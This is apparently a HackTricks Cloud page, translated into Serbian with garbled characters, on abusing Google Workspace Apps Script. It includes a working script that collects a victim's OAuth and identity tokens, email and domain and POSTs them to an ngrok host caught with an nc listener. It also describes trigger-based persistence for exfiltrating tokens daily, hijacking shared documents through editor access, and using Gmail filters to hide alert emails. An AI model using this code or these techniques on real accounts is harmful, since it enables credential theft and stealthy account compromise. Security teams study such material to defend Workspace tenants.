# GWS - Skripte aplikacija

{% hint style="success" %}
NauÄite i veÅ¾bajte hakovanje AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Obuka AWS Crveni Tim StruÄnjak (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
NauÄite i veÅ¾bajte hakovanje GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Obuka GCP Crveni Tim StruÄnjak (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>PodrÅ¾ite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakovanje trikova slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}

## Skripte aplikacija

Skripte aplikacija su **kod koji Ä‡e biti pokrenut kada korisnik sa dozvolom ureÄ‘ivaÄa pristupi dokumentu sa kojim je povezan App Script** i nakon **prihvatanja OAuth prozora**.\
TakoÄ‘e ih je moguÄ‡e postaviti da se **izvrÅ¡avaju svaki odreÄ‘eni vremenski period** od strane vlasnika App Script-a (Upornost).

### Kreiranje App Script-a

Postoji nekoliko naÄina za kreiranje App Script-a, iako su najÄeÅ¡Ä‡i **iz Google dokumenta (bilo kog tipa)** i kao **samostalan projekat**:

<details>

<summary>Kreirajte projekat vezan za kontejner iz Google Docs, Sheets ili Slides</summary>

1. Otvorite dokument Docs, tabelu Sheets ili prezentaciju Slides.
2. Kliknite na **Extensions** > **Google Apps Script**.
3. U ureÄ‘ivaÄu skripti, kliknite na **Untitled project**.
4. Dajte svom projektu ime i kliknite na **Rename**.

</details>

<details>

<summary>Kreirajte samostalan projekat</summary>

Za kreiranje samostalnog projekta iz Apps Script-a:

1. Idite na [`script.google.com`](https://script.google.com/).
2. Kliknite na **New Project**.
3. U ureÄ‘ivaÄu skripti, kliknite na **Untitled project**.
4. Dajte svom projektu ime i kliknite na **Rename**.

</details>

<details>

<summary>Kreirajte samostalan projekat iz Google Drive-a</summary>

1. Otvorite [Google Drive](https://drive.google.com/).
2. Kliknite na **New** > **More** > **Google Apps Script**.

</details>

<details>

<summary>Kreirajte projekat vezan za kontejner iz Google Forms-a</summary>

1. Otvorite formular u Google Forms-u.
2. Kliknite na More more\_vert > **Script editor**.
3. U ureÄ‘ivaÄu skripti, kliknite na **Untitled project**.
4. Dajte svom projektu ime i kliknite na **Rename**.

</details>

<details>

<summary>Kreirajte samostalan projekat koristeÄ‡i alat za komandnu liniju clasp</summary>

`clasp` je alat za komandnu liniju koji vam omoguÄ‡ava da kreirate, povuÄete/puÅ¡ujete i implementirate projekte Apps Script-a sa terminala.

Pogledajte [VodiÄ za korisniÄki interfejs komandne linije koriÅ¡Ä‡enjem `clasp`](https://developers.google.com/apps-script/guides/clasp) za viÅ¡e detalja.

</details>

## Scenario sa App Script-om <a href="#create-using-clasp" id="create-using-clasp"></a>

### Kreirajte Google Sheet sa App Script-om

ZapoÄnite kreiranjem App Script-a, moja preporuka za ovaj scenario je da kreirate Google Sheet i idete na **`Extensions > App Scripts`**, Å¡to Ä‡e otvoriti **novi App Script povezan sa tabelom**.

### Otkrivanje tokena

Da biste omoguÄ‡ili pristup OAuth tokenu, treba da kliknete na **`Services +` i dodate opsege kao Å¡to su**:

* **AdminDirectory**: Pristup korisnicima i grupama direktorijuma (ako korisnik ima dovoljno dozvola)
* **Gmail**: Za pristup podacima Gmail-a
* **Drive**: Za pristup podacima Drive-a
* **Google Sheets API**: Da bi radilo sa okidaÄem

Da biste sami promenili **potrebne opsege** moÅ¾ete otiÄ‡i u podeÅ¡avanja projekta i omoguÄ‡iti: **`PrikaÅ¾i "appsscript.json" manifest fajl u ureÄ‘ivaÄu`.**
```javascript
function getToken() {
var userEmail = Session.getActiveUser().getEmail();
var domain = userEmail.substring(userEmail.lastIndexOf("@") + 1);
var oauthToken = ScriptApp.getOAuthToken();
var identityToken = ScriptApp.getIdentityToken();

// Data json
data = {
"oauthToken": oauthToken,
"identityToken": identityToken,
"email": userEmail,
"domain": domain
}

// Send data
makePostRequest(data);

// Use the APIs, if you don't even if the have configured them in appscript.json the App script won't ask for permissions

// To ask for AdminDirectory permissions
var pageToken = "";
page = AdminDirectory.Users.list({
domain: domain,  // Use the extracted domain
orderBy: 'givenName',
maxResults: 100,
pageToken: pageToken
});

// To ask for gmail permissions
var threads = GmailApp.getInboxThreads(0, 10);

// To ask for drive permissions
var files = DriveApp.getFiles();
}


function makePostRequest(data) {
var url = 'http://5.tcp.eu.ngrok.io:12027';

var options = {
'method' : 'post',
'contentType': 'application/json',
'payload' : JSON.stringify(data)
};

try {
UrlFetchApp.fetch(url, options);
} catch (e) {
Logger.log("Error making POST request: " + e.toString());
}
}
```
{% endcode %}

Za snimanje zahteva moÅ¾ete jednostavno pokrenuti:
```bash
ngrok tcp 4444
nc -lv 4444 #macOS
```
Dozvole zatraÅ¾ene za izvrÅ¡avanje App skripte:

<figure><img src="../../../.gitbook/assets/image (334).png" alt=""><figcaption></figcaption></figure>

{% hint style="warning" %}
Kako se vrÅ¡i spoljni zahtev, OAuth prozor Ä‡e takoÄ‘e **zatraÅ¾iti dozvolu za dostizanje spoljnih taÄaka**.
{% endhint %}

### Kreiranje OkidaÄa

Kada se App proÄita, kliknite na **â° OkidaÄi** da biste kreirali okidaÄ. Kao **funkciju** za pokretanje izaberite **`getToken`**, pokreÄ‡e se prilikom implementacije **`Head`**, u izvoru dogaÄ‘aja izaberite **`Iz tabele`** i tip dogaÄ‘aja izaberite **`Prilikom otvaranja`** ili **`Prilikom izmene`** (u zavisnosti od vaÅ¡ih potreba) i saÄuvajte.

Imajte na umu da moÅ¾ete proveriti **izvrÅ¡avanja App skripti u kartici IzvrÅ¡avanja** ako Å¾elite da debagujete neÅ¡to.

### Deljenje

Da biste **pokrenuli** **App skriptu**, Å¾rtva mora da se poveÅ¾e sa **pristupom ureÄ‘ivaÄa**.

{% hint style="success" %}
**Token** koriÅ¡Ä‡en za izvrÅ¡avanje **App skripte** biÄ‡e onaj **kreatora okidaÄa**, Äak i ako je datoteka otvorena kao ureÄ‘ivaÄ od strane drugih korisnika.
{% endhint %}

### Zloupotreba Deljenih dokumenata sa mnom

{% hint style="danger" %}
Ako vam je neko **podelio dokument sa App skriptama i okidaÄem koji koristi Head** App skripte (a ne fiksnu implementaciju), moÅ¾ete izmeniti kod App skripte (dodavanjem, na primer, funkcija za kraÄ‘u tokena), pristupiti mu, i **App skripta Ä‡e biti izvrÅ¡ena sa dozvolama korisnika koji je podelio dokument sa vama**! (imajte na umu da Ä‡e OAuth token vlasnika imati pristupne opsege koje su dodeljene prilikom kreiranja okidaÄa).

**ObaveÅ¡tenje Ä‡e biti poslato kreatoru skripte ukazujuÄ‡i da je neko izmenio skriptu** (Å ta mislite o koriÅ¡Ä‡enju gmail dozvola za generisanje filtera kako biste spreÄili upozorenje?)
{% endhint %}

{% hint style="success" %}
Ako **napadaÄ izmeni opsege App skripte**, aÅ¾uriranja **neÄ‡e biti primenjena** na dokumentu dok se ne kreira **novi okidaÄ** sa promenama. Stoga, napadaÄ neÄ‡e moÄ‡i da ukrade token kreatora sa viÅ¡e opsega od onih koje je postavio u okidaÄu koji je kreirao.
{% endhint %}

### Kopiranje umesto deljenja

Kada kreirate link za deljenje dokumenta, kreira se link sliÄan ovom: `https://docs.google.com/spreadsheets/d/1i5[...]aIUD/edit`\
Ako **promenite** zavrÅ¡etak **"/edit"** u **"/copy"**, umesto pristupa, Google Ä‡e vas pitati da li Å¾elite da **generiÅ¡ete kopiju dokumenta:**

<figure><img src="../../../.gitbook/assets/image (335).png" alt=""><figcaption></figcaption></figure>

Ako korisnik napravi kopiju i pristupi joj, **sadrÅ¾aj dokumenta i App skripte Ä‡e biti kopirani**, meÄ‘utim **okidaÄi neÄ‡e**, stoga **niÅ¡ta neÄ‡e biti izvrÅ¡eno**.

### Deljenje kao Veb aplikacija

Imajte na umu da je takoÄ‘e moguÄ‡e **deliti App skriptu kao Veb aplikaciju** (u ureÄ‘ivaÄu App skripte, implementirajte kao Veb aplikaciju), ali Ä‡e se pojaviti upozorenje poput ovog:

<figure><img src="../../../.gitbook/assets/image (337).png" alt=""><figcaption></figcaption></figure>

Zatim Ä‡e se pojaviti **tipiÄan OAuth prozor koji traÅ¾i** potrebne dozvole.

### Testiranje

MoÅ¾ete testirati prikupljeni token da biste naveli e-poÅ¡te sa:

{% code overflow="wrap" %}
```bash
curl -X GET "https://www.googleapis.com/gmail/v1/users/<user@email>/messages" \
-H "Authorization: Bearer <token>"
```
{% endcode %}

Lista kalendara korisnika:
```bash
curl -H "Authorization: Bearer $OAUTH_TOKEN" \
-H "Accept: application/json" \
"https://www.googleapis.com/calendar/v3/users/me/calendarList"
```
## Skripta aplikacije kao upornost

Jedna opcija za upornost bila bi **kreiranje dokumenta i dodavanje okidaÄa za funkciju getToken** i deljenje dokumenta sa napadaÄem tako da svaki put kada napadaÄ otvori datoteku, **iznese token Å¾rtve.**

TakoÄ‘e je moguÄ‡e kreirati skriptu aplikacije i postaviti je da se okida svaki X vremena (kao svaki minut, sat, dan...). NapadaÄ koji je **kompromitovao akreditive ili sesiju Å¾rtve mogao bi postaviti okidaÄ vremena za skriptu aplikacije i izneti veoma privilegovani OAuth token svaki dan**:

Jednostavno kreirajte skriptu aplikacije, idite na OkidaÄe, kliknite na Dodaj okidaÄ, i izaberite kao izvor dogaÄ‘aja Vremenski voÄ‘en i izaberite opcije koje vam najbolje odgovaraju:

<figure><img src="../../../.gitbook/assets/image (336).png" alt=""><figcaption></figcaption></figure>

{% hint style="danger" %}
Ovo Ä‡e kreirati bezbednosno upozorenje putem e-poÅ¡te i push poruku na vaÅ¡ mobilni ureÄ‘aj obaveÅ¡tavajuÄ‡i o tome.
{% endhint %}

### Bypass neproverene poruke o deljenom dokumentu

Å taviÅ¡e, ako vam je neko **podelio** dokument sa **pristupom ureÄ‘ivanja**, moÅ¾ete generisati **skripte aplikacije unutar dokumenta** i **VLASNIK (kreator) dokumenta Ä‡e biti vlasnik skripte aplikacije**.

{% hint style="warning" %}
To znaÄi da Ä‡e **kreator dokumenta biti prikazan kao kreator bilo koje skripte aplikacije** koju bilo ko sa pristupom ureÄ‘ivanja kreira unutar njega.

To takoÄ‘e znaÄi da Ä‡e **skripta aplikacije biti poverena radnom okruÅ¾enju Workspace-a** kreatora dokumenta.
{% endhint %}

{% hint style="danger" %}
To takoÄ‘e znaÄi da ako je **skripta aplikacije veÄ‡ postojala** i ljudi su **dali pristup**, bilo ko sa **dozvolom UreÄ‘ivaÄa** na dokumentu moÅ¾e je **izmeniti i zloupotrebiti taj pristup.**\
Da biste zloupotrebili ovo, takoÄ‘e vam trebaju ljudi koji Ä‡e pokrenuti skriptu aplikacije. I jedan koristan trik je da **objavite skriptu kao veb aplikaciju**. Kada **ljudi** koji su veÄ‡ dali **pristup** skripti aplikacije pristupe veb stranici, oni Ä‡e **pokrenuti skriptu aplikacije** (ovo takoÄ‘e funkcioniÅ¡e koristeÄ‡i `<img>` oznake).
{% endhint %}

{% hint style="success" %}
NauÄite i veÅ¾bajte hakovanje AWS-a:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Obuka AWS Crveni Tim StruÄnjak (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
NauÄite i veÅ¾bajte hakovanje GCP-a: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Obuka GCP Crveni Tim StruÄnjak (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>PodrÅ¾ite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakovanje trikova slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
